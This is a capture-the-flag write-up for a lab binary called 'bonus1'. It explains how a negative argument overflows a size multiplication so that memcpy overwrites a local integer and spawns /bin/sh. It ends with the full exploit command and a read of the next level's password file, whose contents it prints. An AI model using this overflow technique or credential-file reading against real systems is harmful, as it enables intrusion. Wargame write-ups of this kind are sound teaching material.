# Bonus1

We have an executable that requires two arguments.

```
$ ls
bonus1
$ ./bonus1
Segmentation fault (core dumped)
$ ./bonus1 1
Segmentation fault (core dumped)
$ ./bonus1 1 2
```

Here is an overview of the code. via dogbolt.
</br>
<<https://dogbolt.org>>

```
void* main(unsigned int a0, struct_0 *a1)
{
    char v0;  // [bp-0x30]
    unsigned int num;  // [bp-0x8]

    num = atoi(a1->field_4);
    if (num > 9)
        return 1;
    memcpy(&v0, a1->field_8, num * 4);
    if (num != 1464814662)
        return 0;
    execl("/bin/sh", "sh");
    return 0;
}
```

We can see that if we manage to make ``num = 1464814662``, we win.
</br>
To do this, we will need to perform an ``integer overflow``.

We can see that ``initially num must be less than 9``, probably a ``negative value``.
</br>
The buffer size is ``40 bytes`` (0x30 - 0x8 = 40).
</br>
That means ``40 to 44 is num``.
</br>
We must therefore find a negative value, which when ``multiplied by 4 becomes 44``.
</br>
``argv1`` must therefore be ``-1073741813``.

```
$ python -c "print((-2**32 + 44) / 4)"
-1073741813
```

Now find what to put in the ``overflow to get 1464814662``.
</br>
We must enter ``0x574f4c46``.

```
$ python -c "print(hex(1464814662))"
0x574f4c46
```

And there you go.

```
$ ./bonus1 -1073741813 $(python -c 'print "A"*40 + "\x46\x4c\x4f\x57"')
$ cat /home/user/bonus2/.pass
579bd19263eb8655e4cf7b742d75edf8c38226925d78db8163506f5191825245
```
